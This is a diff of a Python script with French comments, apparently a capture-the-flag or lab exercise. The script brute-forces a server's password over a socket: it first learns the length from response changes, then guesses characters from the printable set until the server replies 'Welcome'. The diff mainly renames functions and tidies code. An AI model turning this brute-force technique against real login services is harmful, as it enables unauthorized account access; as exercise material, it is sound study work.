@@ -42,27 +42,24 @@ def find_length_of_password(ma_socket: socket.socket, expected_message: string) 
     if ligne == expected_message:
         return len(arbitrary_string)
 
-    # Tant qu'on a pas le message attendu pour dire qu'on a la bonne taille alors on augmente la chaine de caractère
     while ligne != expected_message:
         arbitrary_string += "a"
-        ma_socket.sendall(bytes(arbitrary_string.zfill(4), 'utf-8'))
+        ma_socket.sendall(bytes(arbitrary_string, 'utf-8'))
         ligne = str(ma_socket.recv(1024))
 
     return len(arbitrary_string)
 
-def find_pin_without_optimisation(ma_socket: socket.socket, password_length: int) -> None:
+def find_password(ma_socket: socket.socket, password_length: int) -> None:
     """
     Fonction permettant de se connecter au site internet
     :param ma_socket: Socket utilisateur permettant de se connecter au site internet
     :param password_length: Taille du mot de passe
     :return: None
     """
+    print('Recherche du mot de passe...')
     password_use = ""
     password_found = False
-    caracters = ["a"] * password_length
-    print('Recherche du mot de passe...')
     caracteres_ascii = string.printable
-    incorrect_message = repr(b'Bad password\n')
     partial_password = ["aaaaaaaa"]
     value = 5
     expected_message = repr(b'Welcome :)\n')
@@ -122,7 +119,7 @@ def find_pin_without_optimisation(ma_socket: socket.socket, password_length: int
         print(Fore.RED, "Suite non concluante !")
         print(Fore.RED, "On va appliquer à nouveau l'algorithme !")
         print(Style.RESET_ALL)
-        find_pin_without_optimisation(ma_socket, password_length)
+        find_password(ma_socket, password_length)
 
 
 
@@ -150,7 +147,7 @@ def restart_socket(ma_socket:socket.socket, server: str, port: int) -> socket.so
 
 if __name__ == "__main__":
     main_title = "Authentification à un site\nAppuyez sur les flèches pour naviguer et sur Entrée pour sélectionner"
-    main_options = ["Méthode sans trier les codes possibles", None, "Quitter"]
+    main_options = ["Lancement de la recherche du mot de passe", None, "Quitter"]
     main_menu = TerminalMenu(main_options, title=main_title, cycle_cursor=True, clear_screen=True)
     connection = connect_to_server()
 
@@ -160,7 +157,7 @@ if __name__ == "__main__":
         if main_entry_index == 0:
             expected_message = repr(b'Bad password\n')
             password_length = find_length_of_password(connection, expected_message)
-            find_pin_without_optimisation(connection, password_length)
+            find_password(connection, password_length)
             await_input()
         elif main_entry_index == len(main_options) - 1 or main_entry_index is None:
             print("Au revoir !")
